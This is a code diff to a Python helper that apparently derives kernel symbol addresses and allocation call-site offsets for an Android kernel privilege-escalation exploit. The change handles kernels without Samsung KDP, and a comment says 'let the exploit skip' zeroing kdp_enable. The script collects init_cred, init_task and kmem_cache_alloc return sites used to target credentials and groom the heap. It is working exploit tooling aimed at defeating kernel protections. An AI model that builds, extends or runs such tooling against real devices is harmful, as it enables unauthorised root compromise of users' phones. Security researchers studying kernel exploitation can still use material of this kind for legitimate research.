@@ -806,7 +806,6 @@ def derive(elf: Elf, symbols: dict[str, tuple[int, str]], funcs: list[tuple[int,
         "INIT_UCOUNTS_STATIC": "init_ucounts",
         "INIT_GROUPS_STATIC": "init_groups",
         "INIT_CRED_STATIC": "init_cred",
-        "KDP_ENABLE_STATIC": "kdp_enable",
         "SYSTEM_UNBOUND_WQ_STATIC": "system_unbound_wq",
         "SYSTEM_WQ_STATIC": "system_wq",
         "INIT_TASK_STATIC": "init_task",
@@ -816,6 +815,15 @@ def derive(elf: Elf, symbols: dict[str, tuple[int, str]], funcs: list[tuple[int,
         addr = sym(symbol)
         if addr is not None:
             add(macro, addr, symbol)
+
+    # KDP is Exynos/MediaTek-specific. Qualcomm kernels carry DEFEX but no
+    # kdp_enable, so leave the zeroing address empty and let the exploit skip it.
+    kdp = sym("kdp_enable", required=False)
+    if kdp is not None:
+        add("KDP_ENABLE_STATIC", kdp, "kdp_enable")
+    else:
+        add("KDP_ENABLE_STATIC", 0, "kdp_enable absent (non-KDP kernel)")
+        warn("kdp_enable not found; KDP zeroing is disabled")
 
     # Image-relative offsets.
     image_rel = {
@@ -853,8 +861,16 @@ def derive(elf: Elf, symbols: dict[str, tuple[int, str]], funcs: list[tuple[int,
     timer_site = ret_after_first_bl(elf, symbols, funcs, "do_timer_create", alloc)
     add("STATIC_TIMER_SITE", timer_site, "return address of first bl kmem_cache_alloc in do_timer_create")
     add("TIMER_SITE_LOW16", timer_site & 0xFFFF, "STATIC_TIMER_SITE & 0xffff")
-    cred_site = ret_after_first_bl(elf, symbols, funcs, "prepare_ro_creds", alloc)
-    add("CRED_RO_SITE_LOW21", cred_site & 0x1FFFFF, "return address of first bl kmem_cache_alloc in prepare_ro_creds & 0x1fffff")
+    # prepare_ro_creds is the Samsung KDP read-only cred allocator. Non-KDP
+    # kernels do not have it, so disable the diagnostic cred_ro scan there.
+    if "prepare_ro_creds" in symbols:
+        cred_site = ret_after_first_bl(elf, symbols, funcs, "prepare_ro_creds", alloc)
+        add("CRED_RO_SITE_LOW21", cred_site & 0x1FFFFF,
+            "return address of first bl kmem_cache_alloc in prepare_ro_creds & 0x1fffff")
+    else:
+        cred_site = 0
+        add("CRED_RO_SITE_LOW21", 0, "prepare_ro_creds absent (non-KDP kernel)")
+        warn("prepare_ro_creds not found; the cred_ro diagnostic scan is disabled")
     # dup_task_struct is a separate symbol on most builds. LTO kernels inline
     # it into copy_process, where its task_struct allocation remains the first
     # kmem_cache_alloc_node call.
